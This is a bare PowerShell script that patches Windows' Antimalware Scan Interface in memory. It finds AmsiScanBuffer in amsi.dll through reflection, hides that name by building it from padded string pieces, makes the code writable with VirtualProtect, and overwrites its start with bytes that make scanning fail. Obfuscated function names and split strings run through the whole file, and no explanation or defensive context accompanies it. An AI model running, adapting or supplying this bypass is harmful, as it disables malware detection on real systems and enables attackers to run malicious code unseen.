function AAAAAAAAAAAAAAAAAAAAA {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
     Equals('System.dll')
     }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -like "Ge*P*oc*ddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
@($moduleName)), $functionName))
}


function BBBBBBBBBBBBBBBBBBBBB {
    Param (
     [Parameter(Position = 0, Mandatory = $True)] [Type[]]
     $func, [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
[System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass,
    AutoClass', [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public',
[System.Reflection.CallingConventions]::Standard, $func).
     SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType,
$func). SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}


$ABC="ABCAABC".Replace('ABC', '')
$bCA="ABCmABCsABCiABCSABC".Replace('ABC', '')
$cDW="ABCcABCaABCnABCBABC".Replace('ABC', '')
$dBA = "ABCuABCfABCfABCeABCrABC".Replace('ABC', '')
[IntPtr]$funcAddr = AAAAAAAAAAAAAAAAAAAAA amsi.dll ($ABC+$bCA+$cDW+$dBA)
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((AAAAAAAAAAAAAAAAAAAAA kernel32.dll VirtualProtect), (BBBBBBBBBBBBBBBBBBBBB @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
$buf = [Byte[]] (0xb8,0x34,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3)
$A1 = [System.Runtime.InteropServices.Marshal]
$A2 = 'Copy'
$A3 = $buf
$A4 = 0
$A5 = $funcAddr
$A6 = 12

$A1::$A2($A3, $A4, $A5, $A6)
